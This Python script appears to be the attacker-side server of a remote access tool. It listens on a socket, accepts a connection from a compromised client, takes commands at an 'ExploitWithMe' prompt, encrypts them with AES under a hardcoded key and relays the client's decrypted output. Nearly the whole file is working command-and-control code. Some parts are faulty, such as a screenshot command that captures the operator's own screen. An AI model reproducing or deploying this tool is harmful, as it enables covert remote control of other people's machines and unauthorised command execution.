import os
import socket
import sys
from Crypto.Cipher import AES
from Crypto import Random
import pyscreenshot as ImageGrab

# Configuration
HOST = 'localhost'
PORT = 829
KEY = b'82e672ae054aa4de6f042c888111686a'

# Function to pad plaintext to match block size
def pad(s):
    block_size = AES.block_size
    padding = block_size - len(s) % block_size
    return s + b'\0' * padding

# Function to encrypt plaintext using AES in CBC mode
def encrypt(plaintext):
    plaintext = pad(plaintext)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(plaintext)

# Function to decrypt ciphertext encrypted with AES in CBC mode
def decrypt(ciphertext):
    iv = ciphertext[:AES.block_size]
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
    return plaintext.rstrip(b'\0')

# Function to capture a screenshot
def capture_screenshot():
    try:
        im = ImageGrab.grab(bbox=(10, 10, 500, 500))
        im.show()
        im.save('im.png')
    except Exception as e:
        print("Error occurred while capturing screenshot:", e)

# Main function
def main():
    # Setup server socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((HOST, PORT))
    server_socket.listen(10)
    print('Attacker Listening Server Started on Port {}...'.format(PORT))

    # Accept incoming connections
    connection, _ = server_socket.accept()

    # Main loop for handling commands
    while True:
        # Prompt for command
        cmd = input('ExploitWithMe >> ').rstrip()

        # Check for special command to capture a screenshot
        if cmd == 'grab_screen':
            capture_screenshot()
            os.system("cat im.png")

        # Check for termination command
        elif cmd == '':
            continue

        # Encrypt and send command to the client
        connection.send(encrypt(cmd))

        # Check if command is termination command
        if cmd == 'terminate':
            server_socket.close()
            sys.exit(0)

        # Receive and decrypt response from the client
        data = connection.recv(4096)
        print(decrypt(data))

if __name__ == '__main__':
    main()
